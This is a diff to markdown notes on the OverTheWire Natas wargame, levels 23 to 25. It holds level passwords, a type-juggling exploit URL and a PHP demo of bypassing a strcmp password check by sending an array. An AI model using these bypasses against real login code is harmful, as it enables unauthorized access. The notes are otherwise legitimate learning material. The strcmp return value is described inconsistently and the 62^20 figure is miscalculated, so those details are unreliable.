@@ -742,7 +742,6 @@ if(array_key_exists("revelio", $_GET)) {
 ## 23->24
 - http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou
 - `natas24:MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd`
-- Any password with a number greater than `10` in front followed by `iloveyou` grants the password.
 ```php
 <?php
     if(array_key_exists("passwd",$_REQUEST)){
@@ -759,3 +758,27 @@ if(array_key_exists("revelio", $_GET)) {
     // morla / 10111
 ?>
 ```
+
+## 24->25
+- http://natas24.natas.labs.overthewire.org/
+- `natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws`
+- https://nils-maeurer.de/post/overthewire-natas22-25/#natas24
+- For this one, we know the max password length is 20, assuming upper and lower case characters and numbers 0-9, that's `62^20`, or `7044 * 10^35`. Too big to brute force.
+- Enter, a `strcmp` vulnerability... https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016
+- The vulnerability is `strcmp` returns `0` if a string is compared to an empty array 
+```php
+<?php
+    // Simulate receiving array in request
+    $_REQUEST["passwd"] = array("test"); 
+    
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(!strcmp($_REQUEST["passwd"],"test")){
+            echo "<br>Success!<br>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+?> 
+```
+This would print "Success!" because passing an array to `strcmp()` causes it to return `NULL`, and `!NULL` is `TRUE`.
